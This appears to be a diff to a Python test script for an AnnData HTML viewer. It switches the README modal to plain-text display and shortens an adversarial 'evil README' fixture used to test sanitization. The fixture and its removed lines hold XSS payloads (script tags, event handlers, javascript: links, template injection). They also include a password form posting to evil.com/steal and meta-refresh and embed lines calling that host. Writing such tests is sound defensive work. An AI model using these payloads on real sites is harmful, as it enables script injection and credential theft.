@@ -2111,10 +2111,8 @@ For questions about this dataset: `genome-lab@example-hospital.org`
         "17. README Icon",
         adata_readme._repr_html_(),
         "When <code>uns['README']</code> contains a string, a small ⓘ icon appears in the header. "
-        "Click the icon to open a modal with the README content rendered as markdown. "
-        "The modal supports: headers (h1-h4), bold/italic, code blocks, inline code, "
-        "ordered lists (numbered), unordered lists (bulleted), links, tables, and blockquotes. "
-        "Press Escape or click outside to close.",
+        "Click the icon to open a modal with the README content displayed as plain text "
+        "(raw markdown source, not rendered). Press Escape or click outside to close.",
     ))
 
     # Test 18: README icon in No-JS mode
@@ -2686,95 +2684,26 @@ For more details, see the full documentation.
 
     adata_evil.uns["unknown_anndata_type"] = FakeAnndataType()
 
-    # EVIL README - tests the readme modal with all kinds of malicious content
+    # EVIL README - tests the readme modal with adversarial content.
+    # README is displayed as plain text via textContent (not innerHTML),
+    # so none of these vectors can fire. This just verifies the data-readme
+    # attribute handles edge-case content without breaking HTML structure.
     evil_readme = (
-        """# Evil README - XSS and Injection Test
+        """Evil README - XSS and Injection Test
 
-## XSS Attempts
 <script>alert('XSS in readme!')</script>
 <img src=x onerror="alert('img onerror')">
-<svg onload="alert('svg onload')">
-<body onload="alert('body onload')">
-<iframe src="javascript:alert('iframe')"></iframe>
-<a href="javascript:alert('href')">Click me</a>
-<div onclick="alert('onclick')">Click this div</div>
-<input onfocus="alert('onfocus')" autofocus>
-<marquee onstart="alert('marquee')">test</marquee>
-<video><source onerror="alert('video')"></video>
-
-## HTML Injection
-</div></div></div></table></section>
+</div></div></table></section>
 <style>body { display: none !important; }</style>
-<style>* { background: red !important; color: white !important; }</style>
-<link rel="stylesheet" href="http://evil.com/evil.css">
 
-## CSS Injection
-<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:red;z-index:99999;">
-PWNED
-</div>
+Unicode: \u202eSIHT DAER\u202c
+Null bytes: before\x00after
+Emoji bomb: \U0001f480\U0001f480\U0001f480\U0001f480\U0001f480
 
-## Markdown Edge Cases
-[Evil Link](javascript:alert('markdown_link'))
-[Attribute Injection](https://evil.com" onclick="alert('injection')" x=")
-![Evil Image](x" onerror="alert('markdown_img'))
-`<script>alert('in code')</script>`
-
-```html
-<script>alert('in code block')</script>
-```
-
-## Unicode Chaos
-RTL Override: \u202eSIHT DAER\u202c (should appear reversed)
-Null bytes: before\x00teleporting\x00after
-Zero-width: before\u200b\u200b\u200bafter (invisible chars)
-Combining: e\u0301\u0301\u0301\u0301\u0301 (many accents)
-Emoji bomb: 💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀
-Zalgo: H̸̡̪̯ͨ͊̽̅̾ḛ̫̞̜̹̙̈́͊̓̑̄̏ c̷̶̻̠̜̲̗̠̪o̶̜̹̠̺̗m̴̨̙̝̯͕̥̞̥͉̲e̴͕̫͉̮͇̣̮̼̱̤s̵̨͖̖̱̻̣͙̥̱͓
-
-## Nested Markdown (should not execute)
-<div>
-# Heading inside div
-**Bold** and *italic*
-</div>
-
-## Form Injection
-<form action="http://evil.com/steal">
-<input name="password" type="password">
-<button type="submit">Submit</button>
-</form>
-
-## Meta Tags
-<meta http-equiv="refresh" content="0;url=http://evil.com">
-<base href="http://evil.com/">
-
-## Object/Embed
-<object data="http://evil.com/evil.swf"></object>
-<embed src="http://evil.com/evil.swf">
-
-## Event Handlers (comprehensive)
-<div onmouseover="alert('mouseover')">Hover me</div>
-<div onmouseout="alert('mouseout')">Leave me</div>
-<div onmousedown="alert('mousedown')">Click me</div>
-<div onmouseup="alert('mouseup')">Release me</div>
-<div ondblclick="alert('dblclick')">Double click</div>
-<div oncontextmenu="alert('contextmenu')">Right click</div>
-<div onkeydown="alert('keydown')">Type here</div>
-<div ondrag="alert('drag')">Drag me</div>
-<div oncopy="alert('copy')">Copy me</div>
-<div onpaste="alert('paste')">Paste here</div>
-
-## Data URIs
-<a href="data:text/html,<script>alert('data_uri')</script>">Data URI</a>
-<img src="data:image/svg+xml,<svg onload='alert(1)'>">
-
-## Template Injection
 {{constructor.constructor('alert(1)')()}}
 ${alert('template_literal')}
-#{alert('ruby_interpolation')}
 
-The end. If you see this without any alerts or broken layout, the sanitization works!
-
-## Size Bomb (50KB of repeated text below)
+Size bomb below (50KB):
 """
         + "A" * 50000
     )
@@ -2986,13 +2915,10 @@ The end. If you see this without any alerts or broken layout, the sanitization w
         "</ul>"
         "<b>Evil README (click icon to open modal):</b><br>"
         "<ul>"
-        "<li>XSS attempts: script, img onerror, svg onload, iframe, event handlers</li>"
-        "<li>HTML injection: closing tags, style injection, link injection</li>"
-        "<li>CSS injection: position fixed overlay</li>"
-        "<li>Markdown edge cases: javascript: links, attribute injection in URLs, malformed images</li>"
-        "<li>Unicode chaos: RTL override, null bytes, zero-width, zalgo text</li>"
-        "<li>Size bomb: 50KB of repeated characters</li>"
-        "<li>Form injection, meta refresh, data URIs, template injection</li>"
+        "<li>README is displayed as plain text via textContent, so no vectors can fire</li>"
+        "<li>Contains: script tags, event handlers, style injection, closing tags</li>"
+        "<li>Unicode: RTL override, null bytes, emoji</li>"
+        "<li>Template injection attempts, 50KB size bomb</li>"
         "</ul>"
         "<b>Crashing object in varm:</b><br>"
         "<ul>"
